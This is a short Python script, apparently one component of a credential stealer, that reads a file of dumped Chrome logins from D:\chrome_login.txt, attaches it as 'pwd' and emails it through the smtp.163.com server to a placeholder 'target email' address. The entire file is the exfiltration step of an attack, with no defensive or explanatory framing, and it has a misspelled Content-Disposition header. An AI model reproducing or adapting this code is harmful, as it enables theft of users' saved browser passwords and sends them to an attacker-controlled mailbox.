#coding:utf-8
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def email():
  msg = MIMEMultipart()
  #enter email
  _user = "your email"
  _pw = "email_1's password"
  _to = "your target email"
  #构造附件
  att1 = MIMEText(open('D:\\chrome_login.txt','rb').read(),'base64','gb2312')
  att1["Content-Type"] = "application/octet-stream"
  att1["Content-Dispostion"] = 'attachment;filename="pwd"'

  msg.attach(att1)

  msg['TO'] = _to
  msg['FROM'] = _user
  msg['subject'] = 'pwd'

  try:
    #your email server setting
  	server = smtplib.SMTP('smtp.163.com',25)
  	server.connect('smtp.163.com',25)
  	server.login(_user,_pw)
  	server.sendmail(_user,_to,msg.as_string())
  	server.quit()
  	print(" get")
  except:
  	print("default")
